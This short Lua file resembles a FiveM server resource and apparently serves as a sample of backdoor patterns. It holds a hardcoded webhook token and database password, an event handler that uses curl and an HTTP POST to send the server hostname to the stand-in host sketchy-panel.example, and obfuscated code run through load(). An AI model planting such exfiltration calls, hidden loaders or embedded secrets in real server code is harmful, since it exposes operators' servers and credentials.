local Config = {}
Config.Webhook = "https://discord.com/api/webhooks/1234567890/AbCdEfGh-secret-token"
local db_password = "hunter2hunter2"

RegisterNetEvent('sketchy:boot', function()
    os.execute('curl -s http://sketchy-panel.example/collect?srv=' .. GetConvar('sv_hostname', ''))
    PerformHttpRequest('http://sketchy-panel.example/hook', function() end, 'POST', '{}', {})
end)

local _0x4f2a = string.char(112,114,105,110,116,40,39,111,98,102,39,41)
local blob = "\x4c\x6f\x61\x64\x53\x74\x72\x69\x6e\x67\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78"
assert(load(_0x4f2a))()
